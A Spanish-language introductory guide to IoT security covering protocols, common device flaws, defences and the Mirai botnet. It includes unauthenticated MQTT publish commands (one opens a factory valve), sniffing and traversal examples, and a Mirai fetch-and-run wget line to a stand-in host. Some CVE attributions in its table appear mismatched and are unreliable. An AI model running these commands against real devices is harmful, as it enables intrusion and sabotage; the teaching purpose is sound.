---
title: "Fundamentos IoT: Cuando tu Nevera es Hackeada"
level: "inicial"
content_type: "guia"
updated: "2026-06-29"
---
# Fundamentos IoT: Cuando tu Nevera es Hackeada

## Objetivo de esta Guía

Entender por qué el ecosistema del "Internet de las Cosas" (IoT) es, literalmente, el salvaje oeste de la ciberseguridad.
Descubrirás cómo dispositivos aparentemente inofensivos pueden ser convertidos en armas de destrucción digital masiva.

---

## 1. ¿Qué es el IoT?

el **Internet of Things (IoT)** suena a tecnología espacial, pero es muy simple: es tomar objetos cotidianos y pegarles Wi-Fi o Bluetooth. Cosas que nunca en la vida necesitaron internet, de repente están conectadas.
* Focos inteligentes (Philips Hue).
* Cámaras de seguridad de bebés.
* Neveras, aspiradoras y termostatos.
* Dispositivos médicos (Marcapasos).
* Sensores industriales, contadores inteligentes, sistemas de riego.
* Vehículos conectados, telemetría, flotas.

¿Cuando mezclas un objeto de plástico de $5 dólares con internet? Que nadie piensa en asegurarlo.

### El Problema de Negocio
Los fabricantes de estos dispositivos (como fábricas genéricas en Asia) tienen un solo objetivo: **Vender barato y vender rápido**.
Contratar a un experto en ciberseguridad para asegurar el software de una bombilla inteligente de $5 dólares arruinaría su margen de ganancia. Por lo tanto, sacan productos al mercado con seguridad inexistente.

**Por qué esto importa:** Esa bombilla de $5 que compraste en MercadoLibre puede terminar siendo usada para tumbar Netflix a nivel mundial. No es teorético, ya pasó.

---

## 2. Protocolos de Comunicación IoT

El ecosistema IoT utiliza protocolos especializados, cada uno con propiedades de seguridad distintas:

### MQTT (Message Queuing Telemetry Transport)

Protocolo ligero publish/subscribe sobre TCP, estándar ISO 20922. Es el protocolo IoT más utilizado.

* **Arquitectura:** Broker central (mosquitto, EMQX, HiveMQ) + clientes publishers/subscribers.
* **Puertos:** 1883 (TCP plano), 8883 (TLS).
* **Mecanismos de seguridad:**
  - Autenticación: usuario/contraseña plano o certificados X.509.
  - Cifrado: TLS opcional (muchos dispositivos lo omiten para ahorrar CPU).
  - ACLs: Listas de control de acceso por topic.
* **Vulnerabilidades comunes:**
  - Autenticación deshabilitada en brokers de producción.
  - Topics sin ACL donde cualquiera puede publicar o suscribirse.
  - Credenciales hardcodeadas en el firmware.
  - TLS no validado (certificados autofirmados sin verificación).

**Comprobación de seguridad MQTT:**
```bash
# Probar conexión sin autenticación
mosquitto_sub -h broker.iot.empresa.com -t "#" -v
mosquitto_pub -h broker.iot.empresa.com -t "factory/valve" -m "OPEN"

# Sniffing de tráfico MQTT
tcpdump -i eth0 port 1883 -X
```

### CoAP (Constrained Application Protocol)

Protocolo UDP ligero (RFC 7252), similar a HTTP pero para dispositivos muy limitados. Usa DTLS (Datagram TLS) para seguridad.

* **Puertos:** 5683 (UDP), 5684 (DTLS).
* **Métodos:** GET, POST, PUT, DELETE (como HTTP REST).
* **Seguridad:** DTLS con PSK (Pre-Shared Keys) o certificados.
* **Vulnerabilidades:** La naturaleza UDP permite IP spoofing. Amplificación de ataques DDoS (CoAP amplificación).

### Zigbee e hilos

Protocolos de malla (mesh) de baja potencia para domótica.

* **Zigbee:** 2.4 GHz, hasta 250 kbps, malla auto-reparante.
  - Seguridad: AES-128-CCM*, clave de red compartida, clave de link por dispositivo.
  - Vulnerabilidades: Replay attacks si no se implementan counters adecuados. Clave de red extraíble vía UART/JTAG.
* **Thread:** Basado en IPv6 (6LoWPAN), diseñado por Google/Apple.
  - Más seguro por diseño: autenticación DTLS, comisionado con smartphones.

### Bluetooth Low Energy (BLE)

Protocolo de corto alcance para wearables, sensores, balizas.

* **Pairing modes:**
  - **Just Works:** Sin autenticación, vulnerable a MitM.
  - **Passkey Entry:** PIN de 6 dígitos, vulnerable a fuerza bruta.
  - **Numeric Comparison:** Resistente a MitM (no vulnerable a PIN).
  - **Out of Band (OOB):** Usa NFC para intercambio de claves.
* **Ataques conocidos:**
  - **BlueBorne (CVE-2017-0781):** RCE vía BLE en Android, iPhone, Linux, Windows.
  - **BLUR attacks:** Spoofing de BLE a través de relay de paquetes.
  - **BLE Spam:** Inundación de paquetes de advertising para DoS.

### LoRaWAN (Long Range Wide Área Network)

Protocolo LPWAN para IoT de largo alcance y bajo consumo (km de distancia con baterías de años).

* **Seguridad:** AES-128 cifrado de payload (AppSKey) + autenticación de red (NwkSKey).
* **Key Provisioning:** OTAA (Over-The-Air Activation) vs ABP (Activation By Personalization).
* **Vulnerabilidad:** Las claves ABP son estáticas y se almacenan en el dispositivo, extraíbles por JTAG o dumping de flash.

---

## 3. Los Pecados Capitales del IoT

Si analizas una cámara IP barata comprada por internet, casi siempre encontrarás estos 3 errores mortales:

### A. Contraseñas por Defecto Incrustadas (Hardcoded)
Para que el usuario no batalle al instalarla, el fabricante le pone la misma contraseña a todas las cámaras del mundo. Ej: `Usuario: admin`, `Contraseña: admin`.
Lo peor: a veces el fabricante deja una cuenta oculta de mantenimiento en el sistema que el usuario final no puede borrar ni cambiar.

**Base de datos de credenciales por defecto:**
```bash
# Buscar credenciales por defecto en firmware extraído
grep -r "admin" firmware/
grep -r "password" firmware/
# Fuentes externas: default-password.info, cirt.net/passwords
```

### B. Falta de Cifrado (Clear Text)
Para ahorrar batería y poder de procesamiento (CPU), los dispositivos IoT rara vez cifran sus datos. Si el dispositivo envía el video de tu casa hacia la nube del fabricante, suele hacerlo en texto plano (HTTP). Cualquiera en la misma red Wi-Fi puede interceptar el video.

```bash
# Capturar tráfico de IoT en texto plano
airodump-ng wlan0mon --channel 6
tcpdump -i wlan0mon port 80 or port 554 -A
# RTSP streaming sin cifrar
ffplay rtsp://camera-ip:554/live/ch01
```

### C. Imposibilidad de Actualización (No-Patch)
Si mañana descubrimos una vulnerabilidad crítica en Windows, Microsoft manda una actualización y tu laptop se arregla sola.
Si mañana descubrimos una vulnerabilidad en tu termostato inteligente... se quedará vulnerable para siempre. El fabricante no tiene infraestructura para actualizar el termostato por internet de forma segura (y muchas veces el hardware es tan viejo que no soporta nuevo código).

**OTA Update Security:**
Las actualizaciones OTA (Over-The-Air) seguras requieren:
* Firmware firmado con clave privada del fabricante (verificable por bootloader).
* Versión rollback protection (no permitir downgrade a versión vulnerable).
* Cifrado del firmware en tránsito (TLS).
* Integridad verificable (hash SHA-256 firmado).

**Muchos IoT fallan en:**
* Firmware sin firma (cualquiera puede flashear firmware modificado).
* Actualizaciones vía HTTP (MitM puede inyectar firmware malicioso).
* Sin rollback protection (atacante puede downgradear a versión vulnerable conocida).

**Por qué esto importa:** Es como comprar un carro que si se le rompe el motor, no lo puedes llevar al mecánico. Lo botas y compras otro. Así funciona el IoT barato.

---

## 4. Superficie de Ataque IoT

### Web Interface Vulnerabilities
Muchos dispositivos IoT tienen un servidor web embebido para configuración:

* **Default credentials:** admin/admin, root/1234
* **XSS y CSRF:** Sin tokens anti-CSRF en formularios.
* **Command Injection:** Campos de ping/traceroute sin sanitizar.
* **Directory Traversal:** `/cgi-bin/../../etc/passwd`
* **File Upload:** Sin validación de tipo/subida de shell.
* **Session Management:** Cookies sin HttpOnly, Secure, SameSite.

### Network Services Exposed

```bash
# Escanear puertos de un dispositivo IoT
nmap -sV -p 1-65535 192.168.1.100
# Servicios típicos inseguros:
# 23/tcp  - Telnet (sin cifrado, credenciales default)
# 80/tcp  - HTTP (interfaz web)
# 554/tcp - RTSP (streaming de video)
# 1900/udp - UPnP (SSDP)
# 5353/udp - mDNS (Bonjour)
# 5683/udp - CoAP
# 8883/tcp - MQTT (a veces sin TLS)
```

### UPnP (Universal Plug and Play)

Protocolo que permite a dispositivos descubrirse en la red local y abrir puertos automáticamente en el router (port forwarding automático).

**Riesgos:**
* **UPnP SSDP reflection DDoS:** Amplificación de tráfico para ataques DDoS.
* **CallStranger (CVE-2020-12695):** Exfiltración de datos vía UPnP SUBSCRIBE.
* **Port mapping automático:** Expone servicios inseguros del IoT a internet sin que el usuario lo sepa.

### Firmware Backdoors

Los fabricantes a veces dejan puertas traseras intencionales (debug) o accidentales:

* **Cuentas de mantenimiento:** `root:5Ym1b0Y7` (no cambiables por el usuario).
* **Puertos debug:** UART, JTAG, SWD accesibles.
* **APIs ocultas:** Endpoints REST no documentados en el firmware.
* **Telnet habilitado:** Servicio Telnet escuchando en un puerto no estándar.
* **BusyBox con Netcat:** Herramientas de red completas en el dispositivo.

---

## 5. Vulnerabilidades Críticas en IoT (CVEs)

| CVE | Dispositivo | Impacto |
|-----|------------|---------|
| CVE-2021-44228 | Log4Shell afectó dispositivos IoT que usaban Log4j | RCE remota completa |
| CVE-2023-27217 | Múltiples routers TP-Link | RCE sin autenticación |
| CVE-2019-12558 | Philips Hue Bridge | Subida de firmware malicioso sin autenticación |
| CVE-2020-2906 | Cisco RV320/RV325 | Bypass de autenticación y dumping de credenciales |
| CVE-2021-31630 | Raspberry Pi (OpenHAB vulnerabilities) | RCE vía MQTT injection |
| CVE-2017-17215 | Huawei HG532 (router) | RCE vía UPnP (usado en botnet Mirai-variants) |
| CVE-2020-9376 | TP-Link Archer series | Command Injection vía ping parameter |
| CVE-2022-48195 | Múltiples cámaras IP (AVTECH, Hikvision) | RCE vía API insegura (usado en botnets) |
| CVE-2019-12725 | Zeroshell (router OS) | RCE vía Command Injection |

---

## 6. Segmentación de Red IoT (Defensa)

Para mitigar riesgos IoT en una red corporativa o doméstica:

### VLAN de IoT Aislada

```
Internet
    |
[Router/Firewall]
    |-- VLAN 10 (Corporativa - PCs, servidores)
    |      192.168.10.0/24
    |-- VLAN 20 (IoT - Dispositivos inseguros)
    |      192.168.20.0/24
    |-- VLAN 30 (Huesped / Invitados)
           192.168.30.0/24
```

**Reglas de Firewall:**
```
# IoT NO puede iniciar conexión a LAN corporativa
block in on vlan20 proto {tcp, udp} from 192.168.20.0/24 to 192.168.10.0/24

# IoT SOLO puede salir a internet (para alcanzar Cloud del fabricante)
pass out on vlan20 proto {tcp, udp} to any port {80, 443, 8883}

# Gestión de IoT desde LAN corporativa (opcional)
pass in on vlan10 proto tcp from 192.168.10.0/24 to 192.168.20.0/24 port 22 keep state
```

### Otras Defensas

* **mDNS filtering:** Bloquear mDNS entre VLANs para evitar descubrimiento de dispositivos.
* **UPnP deshabilitado** en el router y en los dispositivos.
* **DNS sinkhole:** Bloquear dominios de C2 conocidos para IoT.
* **Network access control (NAC):** Solo dispositivos autorizados pueden unirse a la red.
* **Certificados de cliente:** Autenticación mutua TLS para dispositivos que lo soporten.

---

## 7. El Caso de Estudio: La Botnet Mirai (2016)

La historia más famosa del IoT te va a volar la cabeza. Cuando juntas 300,000 dispositivos inseguros? Que tumban medio internet.

En 2016, un joven creó un virus llamado **Mirai**. En lugar de atacar computadoras potentes, Mirai escaneaba internet buscando exclusivamente cámaras IP, impresoras y routers caseros.
Cuando encontraba uno, intentaba iniciar sesión usando las 60 contraseñas por defecto más comunes del mundo (`admin/admin`, `root/1234`).
Como millones de personas nunca cambian la contraseña de su router, Mirai infectó **300,000 dispositivos en unas pocas horas**.

En lugar de robar datos (una cámara no tiene datos valiosos), Mirai **zombificó** a los dispositivos, creando una "Botnet" (Red de robots).
El creador le dio una orden a su ejército de 300,000 neveras y cámaras: *"Envíen tráfico basura a Dyn (El proveedor de DNS más grande de EE. UU.) al mismo tiempo"*.

**El resultado:** El ataque de Denegación de Servicio (DDoS) fue tan masivo que apagó a Netflix, Twitter, Reddit y Spotify en toda la costa este de los Estados Unidos durante horas. Todo usando cámaras de bebés.

**Técnico:**
```
# Escaneo masivo de internet (Telnet/SSH)
Mirai scanner -> SYN scan a /0 en puerto 23 y 2323
-> Banner grab (intenta login con tabla de 60 credenciales por defecto)
-> Si login exitoso: wget http://malicious/mirai.arm -> chmod +x -> ejecuta

# Ataque DDoS
Mirai C2 -> Comando "GREETH" (GRE Ethernet flood)
Mirai C2 -> Comando "STOMP" (TCP stomp flood)
Mirai C2 -> Comando "DNS" (DNS amplification query)
```

**Variantes después de Mirai (código fuente liberado):**
* Satori, Okiru, Masuta, PureMasuta, Wicked, OMG, Hajime, Reaper.

Mis dispositivos domóticos podrían estar en una cárcel digital siendo usados para cometer delitos sin que yo me entere.

---

## 8. Emulación de Firmware IoT

Para analizar malware o vulnerabilidades IoT sin hardware físico:

**Firmadyne:** Framework de emulación de firmware Linux embebido basado en QEMU.
```bash
# Emular un firmware de router
python firmadyne/sources/extractor/extractor.py -b brand -np firmware.bin images
python firmadyne/scripts/makeImage.py 1
python firmadyne/scripts/inferNetwork.py 1
python firmadyne/scripts/run.sh 1

# Escaneo del dispositivo emulado
nmap -sV 192.168.0.100
# Acceso web a la interfaz emulada
firefox http://192.168.0.100:80
```

**QEMU para emulación de binarios IoT:**
```bash
# Emular un binario ARM (muy común en IoT)
qemu-arm-static ./bin/webs
# Emular sistema completo MIPS
qemu-system-mips -M malta -kernel vmlinux -hda rootfs.ext2 -append "root=/dev/sda"
```

---

## Criterio de Dominio (Autoevaluación)

1. Vas a comprar una cámara de seguridad para tu casa por $10 dólares en una tienda genérica. Basado en los pecados del IoT, ¿Qué es lo primero y más importante que debes cambiar apenas la conectes a la corriente?
2. Explica por qué a un fabricante de tecnología IoT barata no le interesa financieramente diseñar un sistema de actualizaciones remotas automáticas (OTA Updates).
3. ¿Qué es una Botnet y por qué los hackers prefieren infectar 100,000 dispositivos IoT lentos en lugar de 10,000 computadoras potentes?
4. Explica las diferencias de seguridad entre los protocolos MQTT (sin TLS) y MQTT con TLS. ¿Qué información puede interceptar un atacante si un dispositivo IoT usa MQTT plano?
5. ¿Qué es la emulación de firmware con Firmadyne y cómo ayuda al análisis de seguridad de dispositivos IoT?
